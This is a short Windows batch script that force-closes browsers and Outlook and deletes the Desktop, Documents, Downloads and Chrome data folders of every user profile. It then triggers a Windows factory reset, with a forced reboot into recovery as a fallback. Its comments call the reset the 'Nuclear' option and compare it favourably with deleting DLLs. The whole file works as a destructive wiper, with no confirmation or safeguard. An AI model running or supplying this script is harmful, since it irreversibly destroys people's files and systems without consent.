@echo off
:: 1. Kill processes that might lock user files (Browsers, Office, etc.)
taskkill /F /IM chrome.exe /T
taskkill /F /IM msedge.exe /T
taskkill /F /IM outlook.exe /T

:: 2. Delete User Data (Targeting specific high-value folders first)
echo Deleting sensitive data...
for /d %%u in (C:\Users\*) do (
    if not "%%u"=="C:\Users\Public" (
        del /s /q /f "%%u\Desktop\*.*"
        del /s /q /f "%%u\Documents\*.*"
        del /s /q /f "%%u\Downloads\*.*"
        del /s /q /f "%%u\AppData\Local\Google\Chrome\User Data\*.*"
        rd /s /q "%%u\Documents"
    )
)

:: 3. The "Nuclear" Option: Native Windows Factory Reset
:: This is more effective than deleting DLLs because it wipes the drive properly.
echo Initiating System Reset...
systemreset -factoryreset
:: OR for older versions/more aggression:
shutdown /r /o /f /t 00
